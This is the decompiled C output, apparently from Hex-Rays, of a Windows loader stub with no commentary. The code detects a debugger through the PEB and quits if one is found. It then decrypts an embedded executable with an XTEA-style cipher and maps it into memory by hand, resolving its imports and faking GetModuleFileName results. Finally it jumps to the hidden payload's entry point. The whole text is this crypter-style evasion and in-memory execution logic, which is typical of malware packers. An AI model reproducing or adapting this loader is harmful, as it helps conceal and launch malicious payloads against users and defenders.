/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_3E1000(int a1);
BOOL __cdecl sub_3E101D(int a1, LPVOID lpAddress, SIZE_T dwSize);
DWORD __stdcall sub_3E1050(HMODULE a1, CHAR *a2, DWORD a3);
DWORD __stdcall sub_3E1080(HMODULE a1, WCHAR *a2, DWORD a3);
void *__cdecl sub_3E10AF(HMODULE hModule, LPCSTR lpProcName);
BOOL __cdecl sub_3E110E(int a1);
_DWORD *__cdecl sub_3E1121(int a1, int a2);
char __cdecl sub_3E1250(HANDLE hFile, LPVOID lpBuffer, int a3);
char __cdecl sub_3E1286(void *a1, const void *a2, int a3);
unsigned int __cdecl sub_3E12BD(HANDLE *a1, int a2, unsigned int a3);
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
BOOL __cdecl sub_3E1400(HANDLE *a1);
int sub_3E141D();
void __noreturn start(); // weak
struct _TEB *sub_3E1620();
int __cdecl sub_3E1630(int a1, int a2, int a3);
int __cdecl sub_3E16FD(int a1);
int __cdecl sub_3E17C2(int a1, int a2);
int __cdecl sub_3E1860(int a1);
LPVOID __cdecl sub_3E18B0(SIZE_T a1);
void __cdecl sub_3E190C(void *a1);
_BYTE *__cdecl sub_3E1A03(_BYTE *a1, _BYTE *a2, int a3);
int __cdecl sub_3E1A71(unsigned __int8 *a1, _BYTE *a2);
char *__cdecl sub_3E1B50(unsigned int a1, char *a2, unsigned int a3);
char *__cdecl sub_3E1B6B(unsigned int a1, char *a2, unsigned int a3, int a4);
char *__cdecl sub_3E1C2E(signed int a1, char *a2, unsigned int a3);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// DWORD __stdcall GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// BOOL __stdcall CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// HANDLE __stdcall GetProcessHeap();
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_3E3000; // weak
int dword_3EAA0B = 31240; // weak
int dword_3EAA10 = 0; // weak
int dword_3EAA14 = 0; // weak
int dword_3EAA18 = 0; // weak
int dword_3EAA1C = 0; // weak
int dword_413E1D; // weak
int dword_413E21; // weak
int dword_413E25; // weak
int dword_413E29; // weak


//----- (003E1000) --------------------------------------------------------
int __cdecl sub_3E1000(int a1)
{
  return *(_DWORD *)(a1 + 60) + a1;
}

//----- (003E101D) --------------------------------------------------------
BOOL __cdecl sub_3E101D(int a1, LPVOID lpAddress, SIZE_T dwSize)
{
  DWORD v3; // ecx
  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF

  flOldProtect = v3;
  sub_3E1A03(lpAddress, (_BYTE *)a1, dwSize);
  return VirtualProtect(lpAddress, dwSize, 2u, &flOldProtect);
}
// 3E1020: variable 'v3' is possibly undefined

//----- (003E1050) --------------------------------------------------------
DWORD __stdcall sub_3E1050(HMODULE a1, CHAR *a2, DWORD a3)
{
  if ( !a1 || a1 == (HMODULE)dword_3EAA1C )
    a1 = (HMODULE)dword_3EAA18;
  return GetModuleFileNameA(a1, a2, a3);
}
// 3EAA18: using guessed type int dword_3EAA18;
// 3EAA1C: using guessed type int dword_3EAA1C;

//----- (003E1080) --------------------------------------------------------
DWORD __stdcall sub_3E1080(HMODULE a1, WCHAR *a2, DWORD a3)
{
  if ( !a1 || a1 == (HMODULE)dword_3EAA1C )
    a1 = (HMODULE)dword_3EAA18;
  return GetModuleFileNameW(a1, a2, a3);
}
// 3EAA18: using guessed type int dword_3EAA18;
// 3EAA1C: using guessed type int dword_3EAA1C;

//----- (003E10AF) --------------------------------------------------------
void *__cdecl sub_3E10AF(HMODULE hModule, LPCSTR lpProcName)
{
  void *result; // eax
  FARPROC v3; // [esp+0h] [ebp-4h]

  v3 = GetProcAddress(hModule, lpProcName);
  if ( sub_3E1A71((unsigned __int8 *)lpProcName, "GetModuleFileNameA") )
  {
    if ( sub_3E1A71((unsigned __int8 *)lpProcName, "GetModuleFileNameW") )
    {
      result = v3;
    }
    else
    {
      dword_3EAA14 = (int)v3;
      result = sub_3E1080;
    }
  }
  else
  {
    dword_3EAA10 = (int)v3;
    result = sub_3E1050;
  }
  return result;
}
// 3EAA10: using guessed type int dword_3EAA10;
// 3EAA14: using guessed type int dword_3EAA14;

//----- (003E110E) --------------------------------------------------------
BOOL __cdecl sub_3E110E(int a1)
{
  return a1 < 0;
}

//----- (003E1121) --------------------------------------------------------
_DWORD *__cdecl sub_3E1121(int a1, int a2)
{
  _DWORD *result; // eax
  int *v3; // ecx
  HMODULE v4; // [esp-18h] [ebp-1Ch]
  _DWORD *v5; // [esp-14h] [ebp-18h]
  void *v6; // [esp-10h] [ebp-14h]
  int *v7; // [esp-Ch] [ebp-10h]
  _DWORD *i; // [esp-4h] [ebp-8h]

  dword_3EAA18 = (int)GetModuleHandleA(0);
  dword_3EAA1C = a2;
  for ( i = (_DWORD *)(*(_DWORD *)(a1 + 128) + a2); ; i += 5 )
  {
    result = i;
    if ( !i[3] )
      break;
    v4 = LoadLibraryA((LPCSTR)(i[3] + a2));
    if ( i[1] )
      v3 = (int *)(*i + a2);
    else
      v3 = (int *)(i[4] + a2);
    v7 = v3;
    v5 = (_DWORD *)(i[4] + a2);
    while ( *v7 )
    {
      if ( sub_3E110E(*v7) )
        v6 = GetProcAddress(v4, (LPCSTR)(unsigned __int16)*v7);
      else
        v6 = sub_3E10AF(v4, (LPCSTR)(*v7 + a2 + 2));
      *v5++ = v6;
      ++v7;
    }
  }
  return result;
}
// 3EAA18: using guessed type int dword_3EAA18;
// 3EAA1C: using guessed type int dword_3EAA1C;

//----- (003E1250) --------------------------------------------------------
char __cdecl sub_3E1250(HANDLE hFile, LPVOID lpBuffer, int a3)
{
  DWORD NumberOfBytesRead; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesRead = 0;
  do
  {
    if ( !ReadFile(hFile, lpBuffer, a3 - NumberOfBytesRead, &NumberOfBytesRead, 0) )
      return 0;
  }
  while ( NumberOfBytesRead != a3 );
  return 1;
}

//----- (003E1286) --------------------------------------------------------
char __cdecl sub_3E1286(void *a1, const void *a2, int a3)
{
  DWORD v4; // [esp-4h] [ebp-8h] BYREF

  v4 = 0;
  do
  {
    if ( !WriteFile(a1, a2, a3 - v4, &v4, 0) )
      return 0;
  }
  while ( v4 != a3 );
  return 1;
}

//----- (003E12BD) --------------------------------------------------------
unsigned int __cdecl sub_3E12BD(HANDLE *a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp-4h] [ebp-8h]

  for ( i = 0; ; i += 2 )
  {
    result = i;
    if ( i >= a3 )
      break;
    sub_3E1286(a1[1], (const void *)(a2 + 4 * i), 8);
    sub_3E1250(*a1, (LPVOID)(a2 + 4 * i), 8);
  }
  return result;
}

//----- (003E1313) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  int i; // [esp+4h] [ebp-1Ch]
  unsigned int v4; // [esp+8h] [ebp-18h]
  int v5; // [esp+Ch] [ebp-14h]
  unsigned int v6; // [esp+10h] [ebp-10h]
  unsigned int Buffer; // [esp+18h] [ebp-8h] BYREF
  unsigned int v8; // [esp+1Ch] [ebp-4h]

  while ( sub_3E1250(*(HANDLE *)lpThreadParameter, &Buffer, 8) )
  {
    v5 = 32;
    v6 = Buffer;
    v4 = v8;
    for ( i = -957401312; v5--; i += 1640531527 )
    {
      v4 -= (dword_413E29 + (v6 >> 5)) ^ (i + v6) ^ (dword_413E25 + 16 * v6);
      v6 -= (dword_413E21 + (v4 >> 5)) ^ (i + v4) ^ (dword_413E1D + 16 * v4);
    }
    Buffer = v6;
    v8 = v4;
    sub_3E1286(*((void **)lpThreadParameter + 1), &Buffer, 8);
  }
  return 0;
}
// 413E1D: using guessed type int dword_413E1D;
// 413E21: using guessed type int dword_413E21;
// 413E25: using guessed type int dword_413E25;
// 413E29: using guessed type int dword_413E29;

//----- (003E1400) --------------------------------------------------------
BOOL __cdecl sub_3E1400(HANDLE *a1)
{
  CloseHandle(*a1);
  return CloseHandle(a1[1]);
}

//----- (003E141D) --------------------------------------------------------
int sub_3E141D()
{
  int v1; // eax
  char *lpAddress; // [esp+4h] [ebp-4Ch]
  int v3; // [esp+8h] [ebp-48h]
  HANDLE hObject; // [esp+Ch] [ebp-44h]
  HANDLE hReadPipe; // [esp+10h] [ebp-40h] BYREF
  HANDLE v6; // [esp+14h] [ebp-3Ch] BYREF
  struct _PEB *v7; // [esp+18h] [ebp-38h]
  HANDLE v8; // [esp+1Ch] [ebp-34h] BYREF
  HANDLE hWritePipe; // [esp+20h] [ebp-30h] BYREF
  _DWORD *v10; // [esp+24h] [ebp-2Ch]
  DWORD ThreadId; // [esp+28h] [ebp-28h] BYREF
  struct _TEB *v12; // [esp+2Ch] [ebp-24h]
  int v13[8]; // [esp+30h] [ebp-20h] BYREF

  v12 = sub_3E1620();
  v7 = v12->ProcessEnvironmentBlock;
  if ( v7->BeingDebugged )
    return 0;
  dword_413E1D = 4779;
  dword_413E21 = 5204;
  dword_413E25 = 29703;
  dword_413E29 = 13588;
  if ( !CreatePipe(&hReadPipe, &hWritePipe, 0, 0x10u) )
    return 0;
  if ( !CreatePipe(&v8, &v6, 0, 0x10u) )
    return 0;
  hObject = CreateThread(0, 0, StartAddress, &hReadPipe, 0, &ThreadId);
  v13[0] = 1;
  v13[1] = 2;
  v13[2] = 3;
  v13[3] = 4;
  v13[4] = 5;
  v13[5] = 6;
  v13[6] = 7;
  v13[7] = 8;
  sub_3E12BD(&v8, (int)v13, 8u);
  sub_3E12BD(&v8, (int)&unk_3E3000, (unsigned int)dword_3EAA0B >> 2);
  sub_3E1400(&v8);
  sub_3E1400(&hReadPipe);
  CloseHandle(hObject);
  v10 = (_DWORD *)sub_3E1000((int)&unk_3E3000);
  if ( v10 )
  {
    lpAddress = (char *)v10[13];
    sub_3E101D((int)&unk_3E3000, lpAddress, v10[21]);
    sub_3E1630((int)v10, (int)&unk_3E3000, (int)lpAddress);
    v1 = sub_3E1000((int)lpAddress);
    v3 = v1;
    if ( v1 )
    {
      sub_3E1121(v1, (int)lpAddress);
      sub_3E17C2(v3, (int)lpAddress);
      v7->Mutant = lpAddress;
      ((void (__cdecl *)(char *))&lpAddress[v10[10]])(&lpAddress[v10[10]]);
    }
  }
  return 0;
}
// 3EAA0B: using guessed type int dword_3EAA0B;
// 413E1D: using guessed type int dword_413E1D;
// 413E21: using guessed type int dword_413E21;
// 413E25: using guessed type int dword_413E25;
// 413E29: using guessed type int dword_413E29;

//----- (003E1604) --------------------------------------------------------
void __noreturn start()
{
  int v0; // [esp-4h] [ebp-8h]

  v0 = sub_3E141D();
  ExitProcess(v0);
}
// 3E1604: using guessed type void __noreturn start();

//----- (003E1620) --------------------------------------------------------
struct _TEB *sub_3E1620()
{
  return NtCurrentTeb();
}

//----- (003E1630) --------------------------------------------------------
int __cdecl sub_3E1630(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-28h]
  unsigned __int16 i; // [esp+18h] [ebp-10h]
  unsigned __int16 v6; // [esp+20h] [ebp-8h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = *(_WORD *)(a1 + 6);
  v7 = a1 + 248;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= (int)v6 )
      break;
    if ( *(_DWORD *)(40 * i + v7 + 8) >= *(_DWORD *)(40 * i + v7 + 16) )
      v4 = *(_DWORD *)(40 * i + v7 + 16);
    else
      v4 = *(_DWORD *)(40 * i + v7 + 8);
    sub_3E1A03((_BYTE *)(*(_DWORD *)(40 * i + v7 + 12) + a3), (_BYTE *)(*(_DWORD *)(40 * i + v7 + 20) + a2), v4);
  }
  return result;
}

//----- (003E16FD) --------------------------------------------------------
int __cdecl sub_3E16FD(int a1)
{
  int v2; // [esp+0h] [ebp-4h]
  int v3; // [esp+0h] [ebp-4h]

  v2 = 0;
  if ( (a1 & 0x4000000) != 0 )
    v2 = 512;
  if ( (a1 & 0x20000000) != 0 )
  {
    if ( (a1 & 0x40000000) != 0 )
    {
      if ( a1 >= 0 )
        v3 = v2 | 0x20;
      else
        v3 = v2 | 0x40;
    }
    else if ( a1 >= 0 )
    {
      v3 = v2 | 0x10;
    }
    else
    {
      v3 = v2 | 0x80;
    }
  }
  else if ( (a1 & 0x40000000) != 0 )
  {
    if ( a1 >= 0 )
      v3 = v2 | 2;
    else
      v3 = v2 | 4;
  }
  else if ( a1 >= 0 )
  {
    v3 = v2 | 1;
  }
  else
  {
    v3 = v2 | 8;
  }
  return v3;
}

//----- (003E17C2) --------------------------------------------------------
int __cdecl sub_3E17C2(int a1, int a2)
{
  int result; // eax
  int v3; // eax
  SIZE_T v4; // [esp-1Ch] [ebp-20h]
  void *v5; // [esp-18h] [ebp-1Ch]
  DWORD v6; // [esp-14h] [ebp-18h] BYREF
  unsigned __int16 i; // [esp-10h] [ebp-14h]
  int v8; // [esp-Ch] [ebp-10h]
  unsigned __int16 v9; // [esp-8h] [ebp-Ch]
  int v10; // [esp-4h] [ebp-8h]

  v8 = a1 + 248;
  v9 = *(_WORD *)(a1 + 6);
  v10 = a1 + 248;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= (int)v9 )
      break;
    v5 = (void *)(*(_DWORD *)(40 * i + v10 + 12) + a2);
    v4 = *(_DWORD *)(40 * i + v10 + 8);
    v3 = sub_3E16FD(*(_DWORD *)(40 * i + v10 + 36));
    VirtualProtect(v5, v4, v3, &v6);
  }
  return result;
}

//----- (003E1860) --------------------------------------------------------
int __cdecl sub_3E1860(int a1)
{
  int result; // eax

  if ( a1 < 65 || a1 > 90 )
    result = a1;
  else
    result = a1 + 32;
  return result;
}

//----- (003E18B0) --------------------------------------------------------
LPVOID __cdecl sub_3E18B0(SIZE_T a1)
{
  HANDLE v1; // eax

  v1 = GetProcessHeap();
  return HeapAlloc(v1, 0, a1);
}

//----- (003E190C) --------------------------------------------------------
void __cdecl sub_3E190C(void *a1)
{
  HANDLE v1; // eax

  if ( a1 )
  {
    v1 = GetProcessHeap();
    HeapFree(v1, 0, a1);
  }
}

//----- (003E1A03) --------------------------------------------------------
_BYTE *__cdecl sub_3E1A03(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *v5; // [esp-4h] [ebp-8h]

  v5 = a1;
  while ( a3-- )
    *a1++ = *a2++;
  return v5;
}

//----- (003E1A71) --------------------------------------------------------
int __cdecl sub_3E1A71(unsigned __int8 *a1, _BYTE *a2)
{
  int v3; // [esp+0h] [ebp-4h]

  while ( 1 )
  {
    v3 = *a1 - (unsigned __int8)*a2;
    if ( v3 || !*a2 )
      break;
    ++a1;
    ++a2;
  }
  if ( v3 < 0 )
    return -1;
  if ( v3 > 0 )
    v3 = 1;
  return v3;
}

//----- (003E1B50) --------------------------------------------------------
char *__cdecl sub_3E1B50(unsigned int a1, char *a2, unsigned int a3)
{
  sub_3E1B6B(a1, a2, a3, 0);
  return a2;
}

//----- (003E1B6B) --------------------------------------------------------
char *__cdecl sub_3E1B6B(unsigned int a1, char *a2, unsigned int a3, int a4)
{
  char *result; // eax
  char *v5; // [esp+0h] [ebp-10h]
  char v6; // [esp+7h] [ebp-9h]
  unsigned int v7; // [esp+8h] [ebp-8h]
  char *v8; // [esp+Ch] [ebp-4h]
  char *v9; // [esp+Ch] [ebp-4h]

  v8 = a2;
  if ( a4 )
  {
    *a2 = 27;
    *a2 += 18;
    v8 = a2 + 1;
    a1 = -a1;
  }
  v5 = v8;
  do
  {
    v7 = a1 % a3;
    a1 /= a3;
    if ( v7 <= 9 )
      *v8 = v7 + 48;
    else
      *v8 = v7 + 87;
    ++v8;
  }
  while ( a1 );
  *v8 = 0;
  v9 = v8 - 1;
  do
  {
    v6 = *v9;
    *v9 = *v5;
    *v5 = v6;
    --v9;
    result = ++v5;
  }
  while ( v5 < v9 );
  return result;
}

//----- (003E1C2E) --------------------------------------------------------
char *__cdecl sub_3E1C2E(signed int a1, char *a2, unsigned int a3)
{
  if ( a3 == 10 && a1 < 0 )
    sub_3E1B6B(a1, a2, 0xAu, 1);
  else
    sub_3E1B6B(a1, a2, a3, 0);
  return a2;
}

// nfuncs=26 queued=26 decompiled=26 lumina nreq=0 worse=0 better=0
// ALL OK, 26 function(s) have been successfully decompiled
